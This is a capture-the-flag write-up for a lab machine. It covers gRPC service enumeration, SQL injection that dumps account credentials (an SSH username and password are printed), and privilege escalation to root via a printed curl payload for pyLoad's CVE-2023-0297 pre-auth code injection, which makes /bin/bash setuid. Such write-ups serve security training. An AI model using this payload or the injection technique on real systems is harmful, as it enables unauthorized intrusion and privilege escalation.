![Pasted image 20230706101542](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/64857823-64ca-491b-92e4-f0f2737ea34a)

# Enumeration

Nmap:

![Pasted image 20230706103908](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/dfa0c896-98e1-4331-8e4b-5fb848abf31d)

After scanning all ports for services, there is exactly two ports open: SSH, and an unknown service on a non-standard port. That is likely our way in.... 

Trying to navigate to the site in a web browser just shows non-readable string of characters:

![Pasted image 20230706104449](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/6132acbe-69f7-4543-a976-c89f9c87cfef)

Based on a quick google search, it looks to be used by a service called gRPC. 


# Foothold

I found a tool that is used like curl for this service called grpcurl. 
![Pasted image 20230706110007](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/7a8fe4b3-7567-44ae-b96e-59c0d89325ab)

Will probably want to look deeper into this... 
![Pasted image 20230706110311](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/ec62302d-278a-42de-81d3-92b44b702292)

Starting to get somewhere...
Might not be able to go further with this tool.... grpcui is another interesting one, though.... 
Finally was able to get grpcui working. I'm greeted with a login form thing. I can basically send login requests and the program will display the response.
I tried admin admin and it looks like I'm given an ID and a token:
![Pasted image 20230706132946](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/168f14d9-f73e-4343-908e-1d0b3892eb47)

So that's neat. Not sure what to do with this information at the moment... 
```
id:
450
token:
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODg2NzQ2Nzh9.8CAJaOHpBOnTtj1I2Mlx4y7RE_Mzo0jajisozx_QPGs'
```
Not sure what I can do here, but it's definately talking to a sql server of some kind. Maybe it's exploitable that way? 
On the 'getinfo' form for the page, I can add the token header with the token created by testing the admin login, and then entering in the ID. Maybe that's my entrypoint? Possibly an injection... 

Some simple guessing that there was a table called "accounts" lead me to be able to get the information I needed. Note, that if there are more than one (and we know there are because admin:admin is a thing here), I'll need to use the `GROUP_CONCAT()` function to list all of them that exist. We can exclued any "admin" ones since we know that one exists. 
I was then able to find a usernames:
![Pasted image 20230706140042](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/1a21ff41-7f60-4a34-81e2-432a1a626ff9)

And the passwords:
![Pasted image 20230706135545](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/4cba70c8-ad48-4ad1-abb5-1cae0d853e24)

 And with that, we have an SSH login:
```
sau
HereIsYourPassWord1431
```
![Pasted image 20230706140727](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/846837dc-4cae-4e14-906a-fad4c82ad443)

Nice!

# PrivEsc

Not in the sudo group 😞
I'll try linpeas next to see if it digs anything juicy up...
Nothing major, but there is one strange thing. It shows that port 8000 is open, which did not come up in my nmap scans... 
![Pasted image 20230706141903](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/7fce4314-c08f-4fc3-b9d9-a00b02156e6f)

It's also a listening port which might be why it wasn't sending anything out when I scanned it... 
Looking deeper through the linpeas scans, I could find a reference to a service running called `pyload` which is interesting. 

I found a CVE related to the program. It involves sending a specially crafted curl request to the port which will trick the server into making /bin/bash a setuid binary. 
https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad#exploit-code
```bash
curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"chmod%20u%2Bs%20%2Fbin%2Fbash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
```

When this is sent via my ssh session:
![Pasted image 20230706143045](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/c06d92fe-5456-4681-87ec-06d3458ab3fc)

That's root!!
